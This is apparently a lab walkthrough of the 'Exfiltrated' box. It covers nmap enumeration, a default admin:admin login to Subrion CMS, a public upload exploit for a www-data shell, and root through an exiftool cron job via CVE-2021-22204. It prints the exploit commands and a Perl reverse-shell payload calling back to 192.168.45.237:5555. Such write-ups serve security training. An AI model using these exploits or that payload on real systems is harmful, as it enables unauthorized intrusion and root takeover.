---
tags:
  - Privilege-Escalation
  - Linux
---
Difficulty: Easy
# Service Enumeration
`nmap $ip -p- -sV -sC -oN ver_script.nmap`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 7 disallowed entries
| /backup/ /cron/? /front/ /install/ /panel/ /tmp/
|_/updates/
|_http-title: Did not follow redirect to http://exfiltrated.offsec/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Seeing that we only have SSH and HTTP open on TCP, web is most likely going to be our attack vector for gaining initial access.

## Port 80 - Apache/2.4.41 HTTP 
One of our default nmap scripts pointed out that robots.txt is exists and has some interesting entries:

```
User-agent: *
Disallow: /backup/
Disallow: /cron/?
Disallow: /front/
Disallow: /install/
Disallow: /panel/
Disallow: /tmp/
Disallow: /updates/
```

If we try to navigate to any of these locations, we're redirected to exfiltrated.offsec/ and the page fails to load. I'll append the following to my /etc/hosts file to be able to resolve exfiltrated.offsec to the IP adddress:
`192.168.120.163 exfiltrated.offsec`

On exfiltrated.offsec we see that the site is using Subrion CMS and has an authenticated admin dashboard on /panel, which reveals we're on version 4.2.1.

![[Pasted image 20250511142945.png]]

We're able to authenticate with admin:admin to gain access to the login page.

It looks like there may be multiple vulnerabilities in this version with public exploits...

![[Pasted image 20250511141426.png]]

While I haven't used Subrion before, I know that in the case of Wordpress, access to the admin panel can be leveraged to gain a reverse shell on the server by uploading and executing a PHP reverse shell.

This exploit sounds like the same idea: https://www.exploit-db.com/exploits/49876

## Initial Access
I was able to run it to gain a shell as www-data:
`python3 49876.py -u http://exfiltrated.offsec/panel/ --user=admin --passw=admin`

*I got some errors at first and found that the script breaks if you don't have a '/' at the end of the URL.*

# Privilege Escalation

I found that as the www-data user, I'm unable to traverse to any other paths in the filesystem, and there aren't any interesting files in the current directory.

Since we don't have much room to manually enumerate for privesc opportunities, I'll use [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).
I'll download linpeas to my attacking machine, copy it to the target host, and run it. This helped me discover the following cronjob in `/etc/crontab`:

`* * * * * root  bash /opt/image-exif.sh`

```
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata

echo -ne "\\n metadata directory cleaned! \\n\\n"

IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename;
do
    exiftool "$IMAGES/$filename" >> $LOGFILE
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```

We see it runs exiftool on jpg files in `/var/www/html/subrion/uploads`, which is also our working directory.

`python3 50911.py -s 192.168.45.237 5555`
```
/home/kali/exfiltrated/server/50911.py:61: SyntaxWarning: invalid escap
e sequence '\c'
  payload = "(metadata \"\c${"

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....

RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprot
obyname('tcp'));if(connect(S,sockaddr_in(5555,inet_aton('192.168.45.237')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")
RUNTIME: DONE - Exploit image written to 'image.jpg'
```

Dropping this image.jpg into `/var/www/html/subrion/uploads` and waiting, we receive a connection on port 5555 as root. 